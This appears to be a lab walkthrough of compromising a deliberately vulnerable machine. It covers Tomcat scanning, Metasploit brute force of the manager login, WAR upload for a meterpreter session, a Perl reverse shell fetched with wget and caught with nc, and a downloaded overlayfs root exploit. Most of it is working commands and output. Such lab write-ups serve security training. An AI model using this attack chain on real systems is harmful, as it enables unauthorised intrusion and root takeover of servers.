# Tomcat

Goal of this attack is to deploy a reverse shell on the target machine.

## Port scanning to identify Tomcat

Let's scan the target machine (`canyoupwnme`) with `nmap`

    $ nmap -A -T4 -sT -p1-65535 canyoupwnme
    ...
    8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
    | http-methods:
    |   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
    |_  Potentially risky methods: PUT DELETE
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: Apache-Coyote/1.1
    |_http-title: Apache Tomcat
    ...

## Check what is available

With your browser, open the URL

    http://canyoupwnme:8080/manager

Seems that the Tomcat's management console is available, but authentication is
needed. Metsasploit can help us...

## Brute forcing the Tomcat's management console

    msf > use auxiliary/scanner/http/tomcat_mgr_login
    msf auxiliary(tomcat_mgr_login) > set rhosts canyoupwnme
    msf auxiliary(tomcat_mgr_login) > set rport 8080
    msf auxiliary(tomcat_mgr_login) > exploit

    [!] No active DB -- Credential data will not be saved!
    [-] 10.0.100.195:8080 TOMCAT_MGR - LOGIN FAILED: admin:admin (Incorrect: )
    [-] 10.0.100.195:8080 TOMCAT_MGR - LOGIN FAILED: admin:manager (Incorrect: )
    ...)
    [+] 10.0.100.195:8080 - LOGIN SUCCESSFUL: tomcat:tomcat
        ...
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf auxiliary(tomcat_mgr_login) > quit

Yep! Credentials `tomcat:tomcat` were found. Still using Metasploit, we can
upload a crafted `.WAR` in order to have a meterpreter session.

## Startin a meterpreter session

    msf > use exploit/multi/http/tomcat_mgr_upload
    msf exploit(tomcat_mgr_upload) > set username tomcat
    msf exploit(tomcat_mgr_upload) > set password tomcat
    msf exploit(tomcat_mgr_upload) > set rhost canyoupwnme
    msf exploit(tomcat_mgr_upload) > set rport 8080
    msf exploit(tomcat_mgr_upload) > exploit

    [*] Started reverse TCP handler on 10.0.100.245:4444
    [*] canyoupwnme:8080 - Retrieving session ID and CSRF token...
    [*] canyoupwnme:8080 - Uploading and deploying Hv5hJD7sAuzbRX3UGWiOctD6yz3j...
    [*] canyoupwnme:8080 - Executing Hv5hJD7sAuzbRX3UGWiOctD6yz3j...
    [*] canyoupwnme:8080 - Undeploying Hv5hJD7sAuzbRX3UGWiOctD6yz3j ...
    [*] Sending stage (45741 bytes) to 10.0.100.195
    [*] Meterpreter session 1 opened (10.0.100.245:4444 -> 10.0.100.195:52043) at 2016-04-18 13:33:40 +0200

    meterpreter > shell
    Process 1 created.
    Channel 1 created.
    id
    uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)

## Becoming `root`

On the attacker machine, download and configure a Perl reverse shell

    $ wget http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz
    $ tar zxvf perl-reverse-shell-1.0.tar.gz
    $ cd perl-reverse-shell-1.0
    $ vim perl-reverse-shell.pl # set IP and PORT at lines 45 and 46

Once prepared, upload the reverse shell on the target machine using the
meterpreter

    meterpreter > upload perl-reverse-shell.pl /tmp/perl-reverse-shell.pl
    [*] uploading  : perl-reverse-shell.pl -> /tmp/perl-reverse-shell.pl
    [*] uploaded   : perl-reverse-shell.pl -> /tmp/perl-reverse-shell.pl

On the attacker machine, start listening

    $ nc -nvp 9876
    listening on [any] 9876 ...

while on the victim machine, execute the Perl script

    meterpreter > shell
    Process 2 created.
    Channel 3 created.
    perl /tmp/perl-reverse-shell.pl
    Content-Length: 0
    Connection: close
    Content-Type: text/html

    Content-Length: 43
    Connection: close
    Content-Type: text/html

    Sent reverse shell to 10.0.100.245:9876<p>

On the attacker machine you should see something like that

    connect to [10.0.100.245] from canyoupwnme.pentest [10.0.100.195] 53929
     12:24:48 up 55 min,  0 users,  load average: 0.00, 0.01, 0.04
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
    uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)
    /
    /usr/sbin/apache: 0: can't access tty; job control turned off
    $

Spawn a `tty` shell

    $ python -c "import pty; pty.spawn('/bin/bash');"
    tomcat7@canyoupwnme:/$  whoami
    whoami
    tomcat7
    tomcat7@canyoupwnme:/$ id
    id
    uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)

and try with the `overlayfs` local root exploit used with
[Redis](000-redis.md)

    $ mkdir tmp
    $ cd tmp
    $ wget https://www.exploit-db.com/download/39166 -O ofs.c
    $ gcc ofs.c -o ofs.bin
    $ ./ofs.bin
    # id
    # uid=0(root) gid=1000(user) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),115(lpadmin),1000(user)

Got it!
